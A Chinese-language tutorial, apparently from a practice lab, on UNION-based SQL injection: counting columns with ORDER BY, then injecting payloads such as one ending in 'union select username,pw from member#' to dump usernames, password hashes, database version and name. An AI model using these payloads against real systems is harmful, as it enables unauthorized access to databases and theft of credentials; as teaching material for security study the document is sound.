---

# 基于 union 的信息获取

## union 联合查询

union 联合命令：

- 用于合并两个或多个 SELECT 语句的结果集，并返回合并后的结果集。

用法举例:

```sql
select username,password from user where id=1 union select 字段1,字段2 from 表名
select username,password from user where id=1 union select 命令1,命令2
```

**_注意联合命令的字段数命令数需要和主查询一致!_**
那么我们怎么知道主查询有多少字段数呢？

## order by 排序

使用**order by**方法，对查询结果进行排序，示例如下：

```sql
select id,email from member where username='kobe' order by 1;
```

该语句后面跟上`order by 1`，表示对**查询结果**按**1 字段**进行排序
**_如果我们写了`order by 3`，实际上查询结果只有 2 个字段，那么会报错！！_**
以字符型注入为例，我们输入`kobe' order by 3#`
![sql_orderby_1.png](image/sql_orderby_1.png)
报错信息为：

```sql
Unknown column '3' in 'order clause'
```

表示没有第三个字段，标明字段数`<3`
输入`kobe' order by 2#`
![sql_orderby_2.png](image/sql_orderby_2.png)
正常输出结果，表示有`>=2`个字段
`<3`,`>=2`,说明字段数为`2`
一个个试就能试出来了

## mysql 命令补充

```sql
Select version(); //取的数据库版本
Select database();//取得当前的数据库
Select user(); //取得当前登录的用户
```

## 总结

1. 通过`order by`方法知道主查询**字段数**

```sql
select id,email from member where username='kobe' order by 3;
```

2. 尝试`union`联合查询，看看能不能得到更多信息

```sql
#比如username、password、id、email、phone之类的同一表下其他信息
#需要通过information_schema拿到信息
select id,email from member where username='kobe' union select 字段1,字段2 from 表名
#数据库信息，比如version()、database()、user()
select id,email from member where username='kobe' union select 命令1,命令2
```

## 具体操作

以字符型注入为例，我们输入以下代码：

```sql
kobe' union select username,pw from member#
#返回了username和pw的md5值
```

![sql_union_1.png](image/sql_union_1.png)

```sql
kobe' union select version(),database()#
#返回了数据库版本号`5.7.26`和当前数据库名`root`
```

![sql_union_2.png](image/sql_union_2.png)
